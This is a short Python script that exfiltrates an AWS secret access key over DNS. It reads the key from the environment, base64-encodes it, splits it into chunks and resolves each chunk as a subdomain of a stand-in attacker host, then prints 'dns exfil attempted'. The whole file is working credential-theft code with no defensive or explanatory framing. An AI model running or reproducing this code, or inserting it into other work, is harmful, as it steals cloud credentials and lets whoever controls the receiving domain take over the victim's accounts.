import base64
import os
import socket

secret = os.environ["AWS_SECRET_ACCESS_KEY"].encode()
encoded = base64.urlsafe_b64encode(secret).decode().rstrip("=")
labels = [encoded[i:i + 30] for i in range(0, len(encoded), 30)]

for label in labels:
    host = label + ".dns.attacker.example"
    try:
        socket.gethostbyname(host)
    except Exception as e:
        print("resolve failed:", e)

print("dns exfil attempted")
